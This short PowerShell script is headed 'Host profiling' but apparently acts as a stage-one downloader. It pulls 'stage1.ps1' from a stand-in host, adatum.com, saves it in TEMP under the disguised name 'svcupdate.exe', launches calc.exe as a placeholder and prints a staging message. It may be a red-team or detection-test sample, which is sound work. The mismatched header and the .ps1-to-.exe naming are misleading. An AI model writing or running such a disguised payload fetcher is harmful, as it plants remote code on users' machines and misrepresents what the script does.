
<# Host profiling #>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'http://adatum.com:80/stage1.ps1',
    [string]$WorkingPath = "$env:TEMP\svcupdate.exe",
    [int]$ConnectionTimeout = 12
)
Invoke-WebRequest -Uri $PayloadUrl -OutFile $WorkingPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
Write-Output "stage 42 initialized"
$ProgressPreference = "SilentlyContinue"
